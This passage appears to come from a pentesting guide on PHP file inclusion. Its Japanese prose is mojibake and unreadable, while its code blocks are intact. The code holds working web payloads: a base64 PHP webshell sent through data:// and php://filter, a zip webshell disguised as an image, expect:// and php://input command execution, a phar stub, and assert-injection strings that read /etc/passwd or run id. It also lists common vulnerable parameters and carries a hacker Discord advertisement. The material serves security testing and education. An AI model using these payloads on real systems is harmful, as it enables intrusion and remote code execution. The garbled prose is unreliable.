ã‚‚ã—ä½•ã‚‰ã‹ã®ç†ç”±ã§**`allow_url_include`**ãŒ**On**ã«ãªã£ã¦ã„ã‚‹ãŒã€PHPãŒå¤–éƒ¨ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’**ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°**ã—ã¦ã„ã‚‹å ´åˆã€[ã“ã®æŠ•ç¨¿](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)ã«ã‚ˆã‚Œã°ã€ä¾‹ãˆã°ãƒ‡ãƒ¼ã‚¿ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦base64ã§ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸb64 PHPã‚³ãƒ¼ãƒ‰ã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã€RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
å‰è¿°ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€æœ€å¾Œã® `+.txt` ãŒè¿½åŠ ã•ã‚ŒãŸç†ç”±ã¯ã€æ”»æ’ƒè€…ãŒ `.txt` ã§çµ‚ã‚ã‚‹æ–‡å­—åˆ—ãŒå¿…è¦ã ã£ãŸãŸã‚ã§ã™ã€‚ãã®ãŸã‚ã€æ–‡å­—åˆ—ã¯ãã‚Œã§çµ‚ã‚ã‚Šã€b64ãƒ‡ã‚³ãƒ¼ãƒ‰å¾Œã«ãã®éƒ¨åˆ†ã¯å˜ãªã‚‹ã‚´ãƒŸã¨ãªã‚Šã€å®Ÿéš›ã®PHPã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œï¼ˆã—ãŸãŒã£ã¦ã€å®Ÿè¡Œã•ã‚Œã¾ã™ï¼‰ã€‚
{% endhint %}

`php://` ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ãªã„åˆ¥ã®ä¾‹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Pythonã®ãƒ«ãƒ¼ãƒˆè¦ç´ 

Pythonã§ã¯ã€æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ãŒã‚ã‚‹å ´åˆï¼š
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ`file_name`ã«**çµ¶å¯¾ãƒ‘ã‚¹**ã‚’æ¸¡ã™ã¨ã€**ä»¥å‰ã®ãƒ‘ã‚¹ãŒå˜ã«å‰Šé™¤**ã•ã‚Œã¾ã™ã€‚
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
ä»¥ä¸‹ã¯ã€[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://docs.python.org/3.10/library/os.path.html#os.path.join) ã«ã‚ˆã‚‹æ„å›³ã•ã‚ŒãŸå‹•ä½œã§ã™ï¼š

> ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒçµ¶å¯¾ãƒ‘ã‚¹ã®å ´åˆã€ã™ã¹ã¦ã®å‰ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒç ´æ£„ã•ã‚Œã€çµ¶å¯¾ãƒ‘ã‚¹ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‹ã‚‰çµåˆãŒç¶šè¡Œã•ã‚Œã¾ã™ã€‚

## Java ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒªã‚¹ãƒˆ

Java ã§ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãŒã‚ã‚‹å ´åˆã€**ãƒ•ã‚¡ã‚¤ãƒ«ã§ã¯ãªããƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’è¦æ±‚**ã™ã‚‹ã¨ã€**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒªã‚¹ãƒˆãŒè¿”ã•ã‚Œã‚‹**ã‚ˆã†ã§ã™ã€‚ã“ã‚Œã¯ä»–ã®è¨€èªã§ã¯èµ·ã“ã‚‰ãªã„ã§ã—ã‚‡ã†ï¼ˆç§ã®çŸ¥ã‚‹é™ã‚Šï¼‰ã€‚

## ãƒˆãƒƒãƒ—25ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

ä»¥ä¸‹ã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰è„†å¼±æ€§ã«å¯¾ã—ã¦è„†å¼±ã§ã‚ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ãƒˆãƒƒãƒ—25ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®ãƒªã‚¹ãƒˆã§ã™ï¼ˆ[ãƒªãƒ³ã‚¯](https://twitter.com/trbughunters/status/1279768631845494787)ã‹ã‚‰å–å¾—ï¼‰:
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHPãƒ©ãƒƒãƒ‘ãƒ¼ã¨ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ãŸLFI / RFI

### php://filter

PHPãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ‡ãƒ¼ã‚¿ã‚’èª­ã¿å–ã‚‹å‰ã¾ãŸã¯æ›¸ãè¾¼ã‚€å‰ã«åŸºæœ¬çš„ãª**å¤‰æ›´æ“ä½œ**ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã«ã¯5ã¤ã®ã‚«ãƒ†ã‚´ãƒªãŒã‚ã‚Šã¾ã™:

* [æ–‡å­—åˆ—ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: ãƒ‡ãƒ¼ã‚¿ã‹ã‚‰ã‚¿ã‚°ã‚’å‰Šé™¤ã—ã¾ã™ï¼ˆ"<"ã¨">"ã®é–“ã®ã™ã¹ã¦ï¼‰
* ã“ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ã€ç¾ä»£ã®PHPã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‹ã‚‰æ¶ˆãˆã¦ã„ã¾ã™
* [å¤‰æ›ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : ç•°ãªã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã«å¤‰æ›ã—ã¾ã™ï¼ˆ`convert.iconv.<input_enc>.<output_enc>`ï¼‰ã€‚ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹**ã™ã¹ã¦ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®ãƒªã‚¹ãƒˆ**ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*`å¤‰æ›ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’æ‚ªç”¨ã™ã‚‹ã¨ã€**ä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’ç”Ÿæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã€ä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’æ›¸ãè¾¼ã‚“ã ã‚Šã€é–¢æ•°ã‚’ä½œæˆã—ãŸã‚Šã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**phpãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä»‹ã—ãŸLFI2RCE**](lfi2rce-via-php-filters.md)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
{% endhint %}

* [åœ§ç¸®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’åœ§ç¸®ã—ã¾ã™ï¼ˆå¤šãã®æƒ…å ±ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™å ´åˆã«ä¾¿åˆ©ï¼‰
* `zlib.inflate`: ãƒ‡ãƒ¼ã‚¿ã‚’è§£å‡ã—ã¾ã™
* [æš—å·åŒ–ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : å»ƒæ­¢äºˆå®š
* `mdecrypt.*` : å»ƒæ­¢äºˆå®š
* ãã®ä»–ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼
* phpã§`var_dump(stream_get_filters());`ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ã„ãã¤ã‹ã®**äºˆæœŸã—ãªã„ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼**ãŒè¦‹ã¤ã‹ã‚Šã¾ã™:
* `consumed`
* `dechunk`: HTTPãƒãƒ£ãƒ³ã‚¯ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’é€†ã«ã—ã¾ã™
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" ãƒ‘ãƒ¼ãƒˆã¯å¤§æ–‡å­—ã¨å°æ–‡å­—ã‚’åŒºåˆ¥ã—ã¾ã›ã‚“
{% endhint %}

### php://fd

ã“ã®ãƒ©ãƒƒãƒ‘ãƒ¼ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹ãŒé–‹ã„ã¦ã„ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚é–‹ã‹ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’æŒã¡å‡ºã™ã®ã«å½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout, and php://stderr** to access the **file descriptors 0, 1, and 2** respectively (not sure how this could be useful in an attack)

### zip:// and rar://

Upload a Zip or Rar file with a PHPShell inside and access it.\
In order to be able to abuse the rar protocol it **need to be specifically activated**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

data://ã‚¹ã‚­ãƒ¼ãƒ ã¯ã€ãƒ‡ãƒ¼ã‚¿ã‚¹ã‚­ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³æ”»æ’ƒã®ä¸€éƒ¨ã¨ã—ã¦æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ã“ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯ã€phpã®è¨­å®š**`allow_url_open`**ã¨**`allow_url_include`**ã«ã‚ˆã£ã¦åˆ¶é™ã•ã‚Œã¦ã„ã¾ã™ã€‚

### expect://

Expectã‚’æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ¬¡ã®ã‚ˆã†ã«ã—ã¦ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POSTãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿è¾¼ã¿ã«`include`ãªã©ã®é–¢æ•°ã‚’åˆ©ç”¨ã™ã‚‹å ´åˆã«ã€PHPã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ä»¥ä¸‹ã«ç¤ºã™PHPã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆã¯ã€`.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
php --define phar.readonly=0 create_path.php
```
å®Ÿè¡Œã™ã‚‹ã¨ã€`test.phar`ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ãŒä½œæˆã•ã‚Œã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

LFIãŒPHPã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œãªã—ã«ãƒ•ã‚¡ã‚¤ãƒ«èª­ã¿å–ã‚Šã®ã¿ã‚’è¡Œã†å ´åˆã€`file_get_contents()`ã€`fopen()`ã€`file()`ã€`file_exists()`ã€`md5_file()`ã€`filemtime()`ã€`filesize()`ãªã©ã®é–¢æ•°ã‚’ä»‹ã—ã¦ã€é€†ã‚·ãƒªã‚¢ãƒ«åŒ–è„†å¼±æ€§ã®æ‚ªç”¨ãŒè©¦ã¿ã‚‰ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€`phar`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ã«é–¢é€£ã—ã¦ã„ã¾ã™ã€‚

`.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§é€†ã‚·ãƒªã‚¢ãƒ«åŒ–è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### ãã®ä»–ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«

ã“ã“ã«[ **å«ã‚ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«**](https://www.php.net/manual/en/wrappers.php)**ã‚’**ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

* [php://memory ãŠã‚ˆã³ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” ãƒ¡ãƒ¢ãƒªå†…ã¾ãŸã¯ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¿ï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³æ”»æ’ƒã§ã©ã®ã‚ˆã†ã«æœ‰ç”¨ã‹ã¯ä¸æ˜ï¼‰
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” HTTP(s) URLã¸ã®ã‚¢ã‚¯ã‚»ã‚¹
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” FTP(s) URLã¸ã®ã‚¢ã‚¯ã‚»ã‚¹
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” åœ§ç¸®ã‚¹ãƒˆãƒªãƒ¼ãƒ 
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” ãƒ‘ã‚¿ãƒ¼ãƒ³ã«ä¸€è‡´ã™ã‚‹ãƒ‘ã‚¹åã‚’æ¤œç´¢ï¼ˆå°åˆ·å¯èƒ½ãªã‚‚ã®ã‚’è¿”ã•ãªã„ãŸã‚ã€ã“ã“ã§ã¯ã‚ã¾ã‚Šæœ‰ç”¨ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” ã‚»ã‚­ãƒ¥ã‚¢ã‚·ã‚§ãƒ«2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” ã‚ªãƒ¼ãƒ‡ã‚£ã‚ªã‚¹ãƒˆãƒªãƒ¼ãƒ ï¼ˆä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã®ã«ã¯å½¹ç«‹ã¡ã¾ã›ã‚“ï¼‰

## PHPã® 'assert' ã‚’ä»‹ã—ãŸLFI

PHPã«ãŠã‘ã‚‹ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰ãƒªã‚¹ã‚¯ã¯ã€æ–‡å­—åˆ—å†…ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ 'assert' é–¢æ•°ã‚’æ‰±ã†å ´åˆã«ç‰¹ã«é«˜ã„ã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«æ–‡å­—ï¼ˆ"..")ã‚’å«ã‚€å…¥åŠ›ãŒãƒã‚§ãƒƒã‚¯ã•ã‚Œã¦ã„ã‚‹ãŒé©åˆ‡ã«ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã¦ã„ãªã„å ´åˆã«ç‰¹ã«å•é¡Œã¨ãªã‚Šã¾ã™ã€‚

ãŸã¨ãˆã°ã€PHPã‚³ãƒ¼ãƒ‰ãŒãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’é˜²ãã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```bash
assert("strpos('$file', '..') === false") or die("");
```
ã“ã‚Œã¯ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’é˜²ãã“ã¨ã‚’ç›®çš„ã¨ã—ã¦ã„ã¾ã™ãŒã€å¶ç„¶ã«ã‚‚ã‚³ãƒ¼ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®ãŸã‚ã®ãƒ™ã‚¯ãƒˆãƒ«ã‚’ä½œæˆã—ã¦ã—ã¾ã„ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«å†…å®¹ã‚’èª­ã‚€ãŸã‚ã«ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€æ”»æ’ƒè€…ã¯æ¬¡ã®ã‚ˆã†ã«ä½¿ç”¨ã§ãã¾ã™ï¼š
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
åŒæ§˜ã«ã€ä»»æ„ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```plaintext
' and die(system("id")) or '
```
é‡è¦ãªã®ã¯ã€ã“ã‚Œã‚‰ã®**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã™ã‚‹**ã“ã¨ã§ã™ã€‚

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ã€çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚Šã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’è¿½ã„ã‹ã‘ã¾ã—ã‚‡ã†

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¾ã—ã‚‡ã†

**[Discord](https://discord.com/invite/N3FrSbmwdy)** ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

## PHP Blind Path Traversal

{% hint style="warning" %}
ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€**PHPé–¢æ•°**ã®**ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹**ã‚’**åˆ¶å¾¡**ã§ãã‚‹å ´åˆã«é–¢é€£ã—ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ãŒã€ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ï¼ˆå˜ç´”ãª **`file()`** ã®å‘¼ã³å‡ºã—ã®ã‚ˆã†ã«ï¼‰ã€‚
{% endhint %}

[**ã“ã®ç´ æ™´ã‚‰ã—ã„æŠ•ç¨¿**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) ã§ã¯ã€PHPãƒ•ã‚£ãƒ«ã‚¿ã‚’ä»‹ã—ã¦**ã‚¨ãƒ©ãƒ¼ã‚ªãƒ©ã‚¯ãƒ«ã‚’ä»‹ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’å¤–éƒ¨ã«æµå‡º**ã•ã›ã‚‹æ–¹æ³•ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

è¦ç´„ã™ã‚‹ã¨ã€ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’**å¤§ãã**ã™ã‚‹ãŸã‚ã«**"UCS-4LE"ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°**ã‚’ä½¿ç”¨ã—ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é–‹ã**PHPé–¢æ•°**ãŒ**ã‚¨ãƒ©ãƒ¼**ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

